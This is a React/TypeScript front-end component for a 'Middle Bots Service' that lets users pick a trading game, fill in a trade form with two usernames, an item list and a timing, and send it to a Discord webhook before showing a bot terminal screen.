import React, { useState } from 'react';
import BackgroundGrid from './components/BackgroundGrid';
import WelcomeScreen from './components/WelcomeScreen';
import BotTerminal from './components/BotTerminal';
import { AppStep, TradeConfig, GameOption } from './types';
import { sendTradeWebhook } from './services/discordService';

// Reliable Unsplash Images that match the descriptions
const GAMES: GameOption[] = [
  { 
    id: 'pvb', 
    name: 'Plants VS Brainrots', 
    // Green/Cave theme
    image: 'https://images.unsplash.com/photo-1518544806314-536197fa443c?q=80&w=800&auto=format&fit=crop' 
  },
  { 
    id: 'sab', 
    name: 'Steal a Brainrot', 
    // Red carpet theme
    image: 'https://images.unsplash.com/photo-1500917293891-ef795e70e1f6?q=80&w=800&auto=format&fit=crop' 
  },
];

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>(AppStep.WELCOME);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [config, setConfig] = useState<TradeConfig>({
    game: '',
    description: '',
    username1: '',
    username2: '',
    tradeTime: '',
  });

  const handleGameSelect = (gameId: string) => {
    const gameName = GAMES.find(g => g.id === gameId)?.name || gameId;
    setConfig(prev => ({ ...prev, game: gameName }));
    setStep(AppStep.TRADE_SETUP);
  };

  const handleTradeSetup = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // Send to Discord
    await sendTradeWebhook(config);
    
    setIsSubmitting(false);
    setStep(AppStep.BOT_ACTIVE);
  };

  return (
    <div className="min-h-screen text-white font-sans selection:bg-cyan-500 selection:text-black">
      <BackgroundGrid />

      {step === AppStep.WELCOME && (
        <WelcomeScreen onContinue={() => setStep(AppStep.SELECT_GAME)} />
      )}

      {step !== AppStep.WELCOME && (
        <div className="relative z-30 min-h-screen flex flex-col items-center pt-10 px-4 pb-10">
          
          {/* Navigation Bar */}
          <div className="w-full max-w-4xl mb-8 flex items-center justify-between animate-fade-in">
             <button 
                onClick={() => setStep(AppStep.WELCOME)} 
                className="group flex items-center gap-2 px-4 py-2 rounded-full bg-black/40 backdrop-blur-md border border-white/10 hover:bg-white/10 transition-all text-sm font-medium text-gray-300 hover:text-white"
                disabled={isSubmitting}
             >
                <span className="group-hover:-translate-x-1 transition-transform">←</span> Back
             </button>
             <div className="px-4 py-2 rounded-full bg-black/40 backdrop-blur-md border border-white/10 text-xs font-bold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-emerald-400 tracking-wider uppercase">
               Middle Bots Service
             </div>
          </div>

          {/* GAME SELECTION */}
          {step === AppStep.SELECT_GAME && (
            <div className="w-full max-w-5xl animate-fade-in">
              <h2 className="text-4xl md:text-5xl font-black text-center mb-12 text-white drop-shadow-[0_0_25px_rgba(255,255,255,0.2)]">
                Select Your Game
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                {GAMES.map((game) => (
                  <button
                    key={game.id}
                    onClick={() => handleGameSelect(game.id)}
                    className="group relative h-72 rounded-3xl overflow-hidden transition-all duration-500 hover:-translate-y-2 hover:shadow-[0_0_40px_rgba(34,211,238,0.2)] border border-white/10"
                  >
                    {/* Image */}
                    <div className="absolute inset-0">
                      <img src={game.image} alt={game.name} className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700" />
                      <div className="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent opacity-80 group-hover:opacity-60 transition-opacity duration-500"></div>
                    </div>
                    
                    {/* Content */}
                    <div className="absolute inset-0 p-8 flex flex-col justify-end items-start">
                      <h3 className="text-3xl font-black text-white mb-2 drop-shadow-md transform translate-y-0 group-hover:-translate-y-1 transition-transform duration-300">{game.name}</h3>
                      <div className="flex items-center gap-2 text-cyan-400 font-bold opacity-0 group-hover:opacity-100 transform translate-y-4 group-hover:translate-y-0 transition-all duration-300">
                        <span>Select Protocol</span>
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M17 8l4 4m0 0l-4 4m4-4H3" /></svg>
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* TRADE SETUP FORM */}
          {step === AppStep.TRADE_SETUP && (
            <div className="w-full max-w-xl animate-fade-in">
              <div className="bg-black/40 backdrop-blur-xl rounded-3xl p-8 md:p-10 shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-white/10 relative overflow-hidden">
                {/* Subtle gradient accent at top */}
                <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-400 via-emerald-400 to-green-500 opacity-50"></div>

                <div className="mb-8 text-center">
                  <h3 className="font-black text-3xl text-white mb-2">Trade Details</h3>
                  <p className="text-gray-400 text-sm">Configure request for <span className="text-cyan-400 font-bold">{config.game}</span></p>
                </div>

                <form onSubmit={handleTradeSetup} className="space-y-6">
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                    <div className="space-y-2">
                      <label className="text-xs font-bold text-gray-500 uppercase tracking-wider ml-1">Trader 1 (You)</label>
                      <input 
                        type="text" 
                        required
                        placeholder="Your Username"
                        className="w-full bg-black/20 border border-white/10 rounded-xl px-4 py-4 text-white placeholder-gray-600 focus:border-cyan-500/50 focus:bg-black/40 focus:outline-none focus:shadow-[0_0_20px_rgba(34,211,238,0.1)] transition-all"
                        value={config.username1}
                        onChange={(e) => setConfig({...config, username1: e.target.value})}
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-bold text-gray-500 uppercase tracking-wider ml-1">Trader 2 (Partner)</label>
                      <input 
                        type="text" 
                        required
                        placeholder="Partner Username"
                        className="w-full bg-black/20 border border-white/10 rounded-xl px-4 py-4 text-white placeholder-gray-600 focus:border-cyan-500/50 focus:bg-black/40 focus:outline-none focus:shadow-[0_0_20px_rgba(34,211,238,0.1)] transition-all"
                        value={config.username2}
                        onChange={(e) => setConfig({...config, username2: e.target.value})}
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase tracking-wider ml-1">Description</label>
                    <textarea 
                      required
                      rows={4}
                      placeholder="List items being traded by both parties..."
                      className="w-full bg-black/20 border border-white/10 rounded-xl px-4 py-4 text-white placeholder-gray-600 focus:border-cyan-500/50 focus:bg-black/40 focus:outline-none focus:shadow-[0_0_20px_rgba(34,211,238,0.1)] transition-all resize-none"
                      value={config.description}
                      onChange={(e) => setConfig({...config, description: e.target.value})}
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase tracking-wider ml-1">Timing</label>
                    <div className="relative">
                      <select 
                        className="w-full bg-black/20 border border-white/10 rounded-xl px-4 py-4 text-white focus:border-cyan-500/50 focus:bg-black/40 focus:outline-none focus:shadow-[0_0_20px_rgba(34,211,238,0.1)] transition-all appearance-none cursor-pointer"
                        value={config.tradeTime}
                        onChange={(e) => setConfig({...config, tradeTime: e.target.value})}
                        required
                      >
                        <option value="" className="bg-gray-900">Select start time...</option>
                        <option value="now" className="bg-gray-900">Right Now</option>
                        <option value="15min" className="bg-gray-900">In 15 Minutes</option>
                        <option value="1hour" className="bg-gray-900">In 1 Hour</option>
                      </select>
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-500">
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                        </svg>
                      </div>
                    </div>
                  </div>
                  
                  <button 
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full mt-8 bg-white text-black font-black text-lg py-4 rounded-xl hover:scale-[1.02] hover:shadow-[0_0_30px_rgba(255,255,255,0.4)] active:scale-95 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isSubmitting ? 'Processing Request...' : 'Initialize Bot'}
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* BOT TERMINAL */}
          {step === AppStep.BOT_ACTIVE && (
            <BotTerminal config={config} />
          )}

        </div>
      )}
    </div>
  );
};

export default App;